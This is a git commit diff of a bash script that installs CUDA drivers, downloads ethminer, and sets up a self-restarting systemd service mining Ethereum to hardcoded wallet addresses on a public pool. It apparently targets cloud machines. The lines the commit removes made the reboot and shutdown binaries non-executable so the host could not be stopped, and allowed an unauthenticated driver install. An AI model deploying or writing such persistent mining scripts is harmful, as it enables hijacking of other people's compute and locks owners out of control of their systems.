6f17223fa75f5253f67add8d64bc90f7b9c1ffe1
mitxter <81735578+mitxter@users.noreply.github.com>
2022-03-21 17:46:37 +0700

    Update and rename hieudheth.sh to anghiem.sh

--- anghiem.sh
+++ anghiem.sh
@@ -1,9 +1,6 @@
 SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
 if [ ! -f "${SCRIPT_DIR}/isHaveSetupCoin.txt" ];
 then
-	
-	date "+%d-%m-%y" >> name
-	name=`cat "name"`
 	echo "taind vip pro" > isHaveSetupCoin.txt
 	cd /usr/local/bin
 	sudo apt-get install linux-headers-$(uname -r) -y
@@ -13,23 +10,14 @@ then
 	sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/7fa2af80.pub
 	echo "deb http://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64 /" | sudo tee /etc/apt/sources.list.d/cuda.list
 	sudo apt-get update
-	sudo apt-get -y install cuda-drivers --allow-unauthenticated
+	sudo apt-get -y install cuda-drivers
 	sudo apt-get install libcurl3 -y
 	sudo wget https://github.com/ethereum-mining/ethminer/releases/download/v0.19.0-alpha.0/ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
 	sudo tar xvzf ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
-	sudo bash -c 'echo -e "[Unit]\nDescription=ETH Miner\nAfter=network.target\n\n[Service]\nType=simple\nRestart=on-failure\nRestartSec=15s\nExecStart=/usr/local/bin/bin/ethminer -U -P stratum://0x139c3ca69e2c4f62db9a0b77b91ce2fd2f3c95d1.southcentralus1v34011211197167@eth.2miners.com:2020 &\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/eth.service'
-	rm -rf name
-	date "+%H%M-%d%m" >> name
-	index=`cat "name"`
-	sudo sed -i 's/TENCUAMAYDAO/'$index'/g' /etc/systemd/system/eth.service
-	
+	sudo bash -c 'echo -e "[Unit]\nDescription=ETH Miner\nAfter=network.target\n\n[Service]\nType=simple\nRestart=on-failure\nRestartSec=15s\nExecStart=/usr/local/bin/bin/ethminer -P stratum1+tcp://0xdf6bf244df793440dbbee649bcf9f355b6cf69d6.hieupro@eth.2miners.com:2020 &\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/eth.service'
 	sudo systemctl daemon-reload
 	sudo systemctl enable eth.service
 	sudo systemctl start eth.service
-	sudo chmod -x /sbin/reboot
-	sudo chmod -x /sbin/shutdown
 else
 	sudo systemctl start eth.service
-	sudo chmod -x /sbin/reboot
-	sudo chmod -x /sbin/shutdown
 fi
